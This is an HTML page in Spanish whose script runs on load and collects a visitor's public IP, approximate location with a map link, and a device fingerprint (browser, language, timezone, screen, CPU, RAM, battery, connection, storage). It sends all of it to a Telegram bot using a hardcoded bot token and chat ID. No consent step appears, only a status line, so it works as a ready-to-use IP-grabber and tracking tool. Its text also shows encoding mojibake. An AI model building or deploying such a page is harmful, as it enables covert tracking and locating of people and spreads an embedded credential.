<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>üåç Geo+ ‚Üí Telegram</title>
  <style>
    body, html {
      margin:0; padding:0;
      width:100%; height:100%;
      display:flex; align-items:center; justify-content:center;
      background:#121212; color:#fff;
      font-family:sans-serif;
    }
    .card {
      background:#1f1f1f;
      padding:2rem; border-radius:12px;
      max-width:400px; width:90%;
      text-align:center;
      box-shadow:0 4px 20px rgba(0,0,0,0.7);
    }
    h1 { margin:0 0 1rem; font-size:1.5rem; }
    .status { margin-top:1rem; font-weight:bold; }
  </style>
</head>
<body>

  <div class="card">
    <h1>Obteniendo y enviando‚Ä¶</h1>
    <p class="status" id="status">Iniciando‚Ä¶</p>
  </div>

  <script>
  (async () => {
    const setStatus = txt => document.getElementById('status').textContent = txt;

    // ‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî AJUSTA ESTO ‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî
    const TOKEN   = '8154780362:AAGABBYGZUdz7x0BEju5ypWzycJfu4WB_g8';
    const CHAT_ID = '7270292739';
    // ‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî

    setStatus('1. IP p√∫blica‚Ä¶');
    let ip = 'No disponible';
    try {
      ip = (await fetch('https://api.ipify.org?format=json').then(r=>r.json())).ip;
    } catch {}

    setStatus('2. Geolocalizando (ipapi.co)‚Ä¶');
    let geo = {};
    try {
      const d = await fetch('https://ipapi.co/json/').then(r=>r.json());
      if (!d.error) {
        geo = {
          source: 'ipapi.co',
          city:         d.city || '‚Äì',
          region:       d.region || '‚Äì',
          region_code:  d.region_code || '‚Äì',
          country:      d.country_name || '‚Äì',
          country_code: d.country || '‚Äì',
          postal:       d.postal || '‚Äì',
          timezone:     d.timezone || '‚Äì',
          org:          d.org || '‚Äì',
          lat:          d.latitude,
          lon:          d.longitude,
          map:          `https://www.google.com/maps/search/?api=1&query=${d.latitude},${d.longitude}`
        };
      } else throw 0;
    } catch {
      setStatus('2b. Fallback ip-api.com‚Ä¶');
      try {
        const d = await fetch(`http://ip-api.com/json/${ip}?fields=status,city,regionName,region,zip,country,countryCode,isp,lat,lon,timezone`)
                         .then(r=>r.json());
        if (d.status==='success') {
          geo = {
            source: 'ip-api.com',
            city:         d.city,
            region:       d.regionName,
            region_code:  d.region,
            country:      d.country,
            country_code: d.countryCode,
            postal:       d.zip,
            timezone:     d.timezone,
            org:          d.isp,
            lat:          d.lat,
            lon:          d.lon,
            map:          `https://www.google.com/maps/search/?api=1&query=${d.lat},${d.lon}`
          };
        }
      } catch {}
    }

    setStatus('3. Recolectando datos‚Ä¶');
    const ua        = navigator.userAgent;
    const plt       = navigator.platform;
    const languages = navigator.languages?.join(', ') || '‚Äì';
    const lang      = navigator.language;
    const tzDev     = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const tzOffset  = new Date().getTimezoneOffset();
    const online    = navigator.onLine ? 'S√≠' : 'No';
    const dpr       = window.devicePixelRatio || 1;
    const scrW      = screen.width; 
    const scrH      = screen.height;
    const colorD    = `${screen.colorDepth} bits`;
    const cores     = navigator.hardwareConcurrency || '‚Äì';
    const ram       = navigator.deviceMemory ? `${navigator.deviceMemory} GB (‚âà)` : '‚Äì';

    let battLevel='‚Äì', battCharging='‚Äì';
    if (navigator.getBattery) {
      try {
        const b = await navigator.getBattery();
        battLevel    = `${Math.round(b.level*100)} %`;
        battCharging = b.charging ? 'S√≠' : 'No';
      } catch {}
    }

    let connInfo='‚Äì';
    if (navigator.connection) {
      const c = navigator.connection;
      connInfo = `${c.effectiveType} @${c.downlink} Mb/s, RTT ${c.rtt} ms`;
    }

    let storage='‚Äì';
    if (navigator.storage?.estimate) {
      try {
        const e = await navigator.storage.estimate();
        storage = `${(e.usage/1024**3).toFixed(2)}/${(e.quota/1024**3).toFixed(2)} GB`;
      } catch {}
    }

    setStatus('4. Preparando mensaje‚Ä¶');
    const message = `
<b>üåç Ubicaci√≥n (via ${geo.source})</b>
üìç ${geo.city}, ${geo.region} (${geo.region_code}) ${geo.postal}, ${geo.country} [${geo.country_code}]
‚åö Zona: ${geo.timezone}
üè¢ Org: ${geo.org}
<a href="${geo.map}">Ver en Maps</a>

<b>üñ•Ô∏è Info Dispositivo</b>
‚Ä¢ <b>IP:</b> ${ip}
‚Ä¢ <b>Plataforma:</b> ${plt}
‚Ä¢ <b>UA:</b> ${ua}
‚Ä¢ <b>Idiomas:</b> ${languages}
‚Ä¢ <b>Root Lang:</b> ${lang}
‚Ä¢ <b>Zona Dev:</b> ${tzDev} (offset ${tzOffset}m)
‚Ä¢ <b>Online:</b> ${online}

<b>‚öôÔ∏è Hardware & Pantalla</b>
‚Ä¢ <b>RAM:</b> ${ram}
‚Ä¢ <b>CPU cores:</b> ${cores}
‚Ä¢ <b>Pantalla:</b> ${scrW}√ó${scrH} px @${dpr}√ó
‚Ä¢ <b>Profundidad:</b> ${colorD}

<b>üîå Conexi√≥n:</b> ${connInfo}
<b>üîã Bater√≠a:</b> ${battLevel} (Cargando: ${battCharging})
<b>üíæ Almacenamiento:</b> ${storage}
`;

    setStatus('5. Enviando a Telegram‚Ä¶');
    const url = `https://api.telegram.org/bot${TOKEN}/sendMessage`
              + `?chat_id=${CHAT_ID}`
              + `&parse_mode=HTML`
              + `&disable_web_page_preview=true`
              + `&text=${encodeURIComponent(message)}`;

    try {
      const res = await fetch(url);
      setStatus(res.ok ? '‚úÖ Enviado' : '‚ùå Error');
    } catch {
      setStatus('‚ùå Excepci√≥n');
    }

  })();
  </script>

</body>
</html>
